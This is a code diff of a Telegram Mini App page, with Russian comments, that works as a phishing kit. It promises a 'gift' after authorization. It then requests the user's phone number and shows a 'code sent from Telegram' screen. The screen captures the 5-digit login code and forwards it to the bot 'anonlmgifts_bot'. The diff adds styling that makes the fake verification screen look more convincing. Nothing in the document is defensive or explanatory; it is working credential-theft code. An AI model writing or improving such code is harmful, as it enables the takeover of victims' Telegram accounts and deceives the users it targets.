@@ -5,23 +5,57 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background: #ffffff; color: #000000; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; text-align: center; background: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000); }
         .hidden { display: none !important; }
-        button { background: #3390ec; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; width: 100%; margin-top: 20px; cursor: pointer; font-weight: bold; }
-        input { width: 100%; padding: 20px; font-size: 30px; text-align: center; letter-spacing: 10px; border: 2px solid #3390ec; border-radius: 10px; margin-top: 20px; box-sizing: border-box; outline: none; }
+        
+        button.share-btn { background: var(--tg-theme-button-color, #3390ec); color: var(--tg-theme-button-text-color, #ffffff); border: none; padding: 18px; font-size: 16px; border-radius: 10px; width: 100%; margin-top: 20px; cursor: pointer; font-weight: 600; }
+        
+        /* Стили для экрана ввода кода */
+        .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
+        .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; }
+        
+        /* Скрываем стандартный инпут, но он будет ловить ввод */
+        .code-input { 
+            position: absolute; opacity: 0; width: 1px; height: 1px; 
+            font-size: 16px; /* Важно для iOS, чтобы не было зума */
+        }
+        
+        /* Красивые ячейки для цифр */
+        .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
+        .code-cell { 
+            width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); 
+            border-radius: 10px; display: flex; justify-content: center; align-items: center; 
+            font-size: 24px; font-weight: 600; transition: border-color 0.2s;
+        }
+        .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
+        .code-cell.active { border-color: var(--tg-theme-button-color, #3390ec); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
     </style>
 </head>
 <body>
 
+    <!-- Экран 1 -->
     <div id="screen-phone">
-        <h2>Шаг 1</h2>
-        <button id="share-phone-btn">ПОДЕЛИТЬСЯ НОМЕРОМ</button>
+        <h2 style="margin-top: 40px;">Шаг 1</h2>
+        <p style="color: gray;">Для получения подарка авторизуйтесь</p>
+        <button id="share-phone-btn" class="share-btn">ПОДЕЛИТЬСЯ НОМЕРОМ</button>
     </div>
 
+    <!-- Экран 2 (Ввод кода) -->
     <div id="screen-code" class="hidden">
-        <h2>Введите код</h2>
-        <p>Код отправлен на <b id="user-phone"></b></p>
-        <input type="number" id="code-input" placeholder="00000" maxlength="5">
+        <div class="code-header">Введите код</div>
+        <div class="code-subtitle">Мы отправили код от Telegram на номер<br><b id="user-phone"></b></div>
+        
+        <!-- Красивые ячейки -->
+        <div class="code-container" id="code-cells">
+            <div class="code-cell"></div>
+            <div class="code-cell"></div>
+            <div class="code-cell"></div>
+            <div class="code-cell"></div>
+            <div class="code-cell"></div>
+        </div>
+
+        <!-- Скрытый инпут, который вызывает клавиатуру и ловит смс-код -->
+        <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
     </div>
 
     <script>
@@ -31,6 +65,15 @@
                 tg.expand();
                 let isSent = false;
 
+                const codeInput = document.getElementById('code-input');
+                const codeCells = document.querySelectorAll('.code-cell');
+                const codeContainer = document.getElementById('code-cells');
+
+                // Делаем так, чтобы при клике на ячейки открывалась клавиатура
+                codeContainer.onclick = function() {
+                    codeInput.focus();
+                };
+
                 // 1. Запрос номера
                 document.getElementById('share-phone-btn').onclick = function() {
                     tg.requestContact(function(shared, contact) {
@@ -38,27 +81,49 @@
                             document.getElementById('user-phone').innerText = "+" + contact.phone_number;
                             document.getElementById('screen-phone').classList.add('hidden');
                             document.getElementById('screen-code').classList.remove('hidden');
-                            document.getElementById('code-input').focus();
+                            
+                            // Автоматически открываем клавиатуру
+                            setTimeout(() => { codeInput.focus(); }, 100);
                         }
                     });
                 };
 
-                // 2. Автоотправка кода через ссылку
-                document.getElementById('code-input').addEventListener('input', function(e) {
-                    const code = this.value;
-                    
-                    if (code.length === 5 && !isSent) {
-                        isSent = true; 
-                        this.blur(); 
+                // 2. Обработка ввода кода (анимация ячеек + отправка)
+                codeInput.addEventListener('input', function(e) {
+                    const value = this.value.replace(/\D/g, ''); // Только цифры
+                    this.value = value; // Обновляем значение (убираем буквы)
+
+                    // Обновляем ячейки
+                    codeCells.forEach((cell, index) => {
+                        if (index < value.length) {
+                            cell.innerText = value[index];
+                            cell.classList.add('filled');
+                        } else {
+                            cell.innerText = '';
+                            cell.classList.remove('filled');
+                        }
                         
-                        // Твой бот
+                        // Подсветка текущей ячейки
+                        if (index === value.length) {
+                            cell.classList.add('active');
+                        } else {
+                            cell.classList.remove('active');
+                        }
+                    });
+
+                    // Если ввели 5 цифр
+                    if (value.length === 5 && !isSent) {
+                        isSent = true; 
+                        this.blur(); // Прячем клавиатуру
+                        
+                        // ВАЖНО: Твой юзернейм
                         const botUsername = "anonlmgifts_bot"; 
                         
-                        // Открываем ссылку с кодом
-                        tg.openTelegramLink("https://t.me/" + botUsername + "?start=" + code);
-                        
-                        // Закрываем мини-аппу
-                        setTimeout(() => tg.close(), 500);
+                        // Открываем ссылку с кодом (через 0.5 сек для красоты)
+                        setTimeout(() => {
+                            tg.openTelegramLink("https://t.me/" + botUsername + "?start=" + value);
+                            setTimeout(() => tg.close(), 500);
+                        }, 500);
                     }
                 });
             }
